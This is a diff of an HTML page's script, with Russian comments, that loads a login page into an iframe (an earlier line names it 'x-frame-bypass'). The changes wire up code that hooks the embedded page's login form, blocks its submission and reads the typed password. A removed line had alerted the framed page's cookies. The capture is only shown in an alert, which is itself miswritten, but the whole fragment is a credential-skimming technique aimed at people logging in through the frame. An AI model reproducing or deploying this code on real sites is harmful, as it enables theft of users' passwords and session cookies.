@@ -34,7 +34,6 @@
         // Функция для выполнения кода внутри iframe после его загрузки
         function manipulateIframeContent() {
             // Получаем доступ к iframe
-            //var iframe = document.getElementById('x-frame-bypass');
 		var iframe = document.querySelector('.asd');
 
             // Проверяем, загрузился ли iframe
@@ -43,16 +42,31 @@
                 var iframeDocument = iframe.contentWindow.document;
 
                 // Пример: Изменяем текст заголовка <h1> в iframe
- 		var header = iframeDocument.querySelector('h2');
-                if (header) {
-                    header.textContent = "Hello from the parent page!";
-			alert(iframeDocument.cookie)
-                }
+ 		//var header = iframeDocument.querySelector('h2');
+		var login_form = iframeDocument.getElementById('login_form')
+		var pass_value = iframeDocument.getElementById('password')
+		    
+		login_form.addEventListener('submit', function(event) {
+        		event.preventDefault(); // Prevent the form from submitting
+
+        		// Get the input value
+        		const inputValue = pass_value.value;
+
+        		// Now you can use 'inputValue' as needed
+        		alert('Input value:', inputValue);
+    		});
+		    
+		     
+               // if (value) {
+                    //header.textContent = "Hello from the parent page!";
+			//alert(iframeDocument.cookie)
+			//alert(value)
+                //}
             }
         }
 
         // Ожидаем, пока iframe загрузится, и затем вызываем функцию
-        //document.querySelector('.asd').addEventListener('load', manipulateIframeContent);
+        document.querySelector('.asd').addEventListener('load', manipulateIframeContent);
     </script>
 </body>
 </html>
